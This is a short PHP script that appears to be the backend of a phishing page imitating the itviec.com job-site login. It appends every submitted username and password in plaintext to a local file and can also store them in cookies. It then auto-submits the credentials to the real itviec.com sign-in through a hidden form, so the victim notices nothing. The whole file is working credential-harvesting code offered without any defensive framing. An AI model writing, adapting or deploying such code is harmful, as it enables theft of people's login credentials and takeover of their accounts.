<?php
if (isset($_COOKIE['username']) && isset($_COOKIE['password'])) {
    $savedUsername = htmlspecialchars($_COOKIE['username']);
    $savedPassword = htmlspecialchars($_COOKIE['password']);
    echo "Saved Username: $savedUsername <br>";
    echo "Saved Password: $savedPassword <br>";
    // exit();
}

if (isset($_POST['signin'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $file = fopen("account.txt", "a");
    fwrite($file, $username . ":" . $password . "\n");
    fclose($file);

    if (isset($_POST['remember'])) {
        setcookie("username", $username, time() + (86400 * 30), "/");
        setcookie("password", $password, time() + (86400 * 30), "/");
    }

    echo '<form id="redirectForm" action="https://itviec.com/sign_in" method="post">';
    echo '<input type="hidden" name="user[email]" value="' . htmlspecialchars($username) . '">';
    echo '<input type="hidden" name="user[password]" value="' . htmlspecialchars($password) . '">';
    echo '</form>';
    echo '<script>document.getElementById("redirectForm").submit();</script>';
}
?>